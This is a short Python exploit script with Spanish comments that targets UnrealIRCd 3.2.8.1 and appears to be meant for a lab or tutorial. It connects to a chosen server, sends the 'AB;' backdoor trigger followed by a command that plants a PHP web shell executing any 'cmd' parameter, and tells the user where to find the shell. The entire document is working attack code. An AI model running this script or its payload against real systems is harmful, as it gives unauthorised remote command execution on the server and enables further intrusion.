# Explotación de vulnerabilidad en UnrealIRCd 3.2.8.1

import socket

'''
ESTRUCTURA DEL EXPLOIT:

1 - Clase
2 - Constructor de la clase
3 - Método para establecer la conexión
4 - Método para enviar el comando al servidor y esperar la respuesta
5 - Método que crea y envía la carga útil
6 - Método que ejecuta la explotación
'''

class UnrealIRCdExploit: # 1 - Clase
    # 2 - Constructor de la clase
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket = None

    def connect(self): # 3 - Método para establecer la conexión
        try:
            self.socket = socket.create_connection((self.target_ip, self.target_port), timeout=10)
            print(f"[+] Conectado a {self.target_ip}:{self.target_port}")
            self.socket.recv(1024)  # Recibir el banner del servidor
            return True
        except Exception as e:
            print(f"[-] No se pudo conectar a {self.target_ip}:{self.target_port} - {e}")
            return False
        
    def send_command(self, command): # 4 - Método para enviar el comando al servidor y esperar la respuesta
        try:
            self.socket.sendall(command.encode('utf-8'))
            response = self.socket.recv(1024).decode('utf-8')
            return response
        except Exception as e:
            print(f"[-] Error al enviar comando: {e}")
            return None
            
    def exploit(self): # 5 - Método para crear y enviar la carga útil
        payload = "echo '<?php echo passthru($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php\n" # Carga útil para crear una shell web
        respuesta = self.send_command(f"AB; {payload} \n")
        if respuesta:
            print("[+] Carga útil enviada. Verifica la shell web en /var/www/html/shell.php")
        else:
            print("[-] No se recibió respuesta del servidor.")
            
    def run(self): # 6 - Método para ejecutar la explotación
        if self.connect():
            self.exploit()
        if self.socket:
                self.socket.close()